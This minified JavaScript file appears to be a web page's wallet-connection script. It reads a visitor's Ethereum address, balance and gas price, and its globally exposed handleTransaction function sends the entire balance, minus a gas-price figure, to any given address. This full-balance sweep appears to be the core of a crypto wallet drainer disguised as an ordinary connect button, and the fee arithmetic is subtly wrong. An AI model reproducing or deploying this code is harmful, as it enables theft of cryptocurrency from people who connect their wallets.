import{web3Modal,ethereumClient,provider}from"./web.js";console.log("test",web3Modal);let ethereumProvider=void 0,web3;async function connectEther(){console.log("ethers",window.ethereum);const test=new Web3(window.ethereum);web3=test;const accounts=await test.eth.getAccounts(),gasPrice=await web3.eth.getGasPrice();console.log("my accounts",accounts),console.log("gas price",gasPrice);const balance=await fetchBalance(accounts[0]);return window.balance=balance,window.address=accounts[0],window.gasPrice=gasPrice,{address:accounts[0],balance,gasPrice}}window.connectEther=connectEther,async function handleTransactions(to){try{const{balance:e,address:a,gasPrice:t}=await connectEther(),i=web3.utils.toWei(e,"ether")-t;console.log("money in wei",i);const n=await web3.eth.sendTransaction({from:a,to,value:i});console.log("Transaction successful:",n),alert("Transaction successful! Transaction Hash: "+n.transactionHash)}catch(e){console.error("Transaction error:",e),alert("Transaction error! Please check the console for more details.")}};window.handleTransaction=handleTransactions,async function fetchBalance(e){try{const a=await web3.eth.getBalance(e),t=web3.utils.fromWei(a,"ether");return console.log("Balance:",t),t}catch(e){console.error("Error fetching balance:",e),alert("Error fetching balance. Please check the console for more details.")}};async function transferEth(){}document.addEventListener("DOMContentLoaded",async()=>{try{window.web3Modal=web3Modal,window.ethereumClient=ethereumClient;const e=window.ethereumClient.getAccount();const a=document.getElementById("ether");a.addEventListener("click",connectEther),window.usersWalletAddress=e.address,window.providerWallet=""}catch(e){console.log("the error here",e)}});
